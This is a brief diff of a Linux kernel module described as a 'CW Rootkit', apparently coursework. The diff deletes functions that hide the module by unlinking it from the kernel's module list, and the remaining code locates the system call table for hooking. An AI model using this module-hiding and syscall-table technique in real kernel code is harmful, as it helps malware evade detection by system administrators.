@@ -14,23 +14,9 @@ MODULE_DESCRIPTION("CW Rootkit");
 MODULE_VERSION("0.0.1");
 
 void **sys_call_table;
-struct list_head *module_list;
 struct sysinfo *info;
 
-void hide(void)
-{
-    module_list = THIS_MODULE->list.prev;
-    list_del(&THIS_MODULE->list);
-}
-
-void unhide(void)
-{
-    list_add(&THIS_MODULE->list, module_list);
-}
-
 static int __init lkm_example_init(void) {
-    //Don't hide the kernel for now
-    //hide();
     printk(KERN_INFO "Hello, World!\n");
 
     sys_call_table = find_syscall_table();
